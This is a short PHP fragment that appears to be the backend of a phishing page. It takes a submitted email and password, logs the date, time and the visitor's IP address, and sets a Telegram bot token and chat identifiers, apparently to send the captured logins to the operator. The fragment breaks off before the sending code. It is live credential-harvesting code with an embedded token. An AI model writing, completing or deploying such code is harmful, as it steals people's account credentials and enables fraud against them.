<?php
// name 
// pw
// subbtn
date_default_timezone_set('Asia/Manila');



if(isset($_POST['foo'])){
    $name  = $_POST['eml'];
    $pw    = $_POST['pwd'];
    $datez = date("Y/m/d");
    $timez =  date("h:i A");
    $day_of_the_week = date("l");
    $backticks = "**";
    $ipAdd = $_SERVER['HTTP_CLIENT_IP'];
    $ip = $_SERVER['HTTP_CLIENT_IP'] 
   ? $_SERVER['HTTP_CLIENT_IP'] 
   : ($_SERVER['HTTP_X_FORWARDED_FOR'] 
        ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        : $_SERVER['REMOTE_ADDR']);


         $token = "6449896778:AAHbpwwkig8sr7japTFkYw0YIRHAIHwYrb8";
    $data = [
        // 'chat_id' => '1002143645972',
        // 'chat_id' => '-@ashleyughchannel',
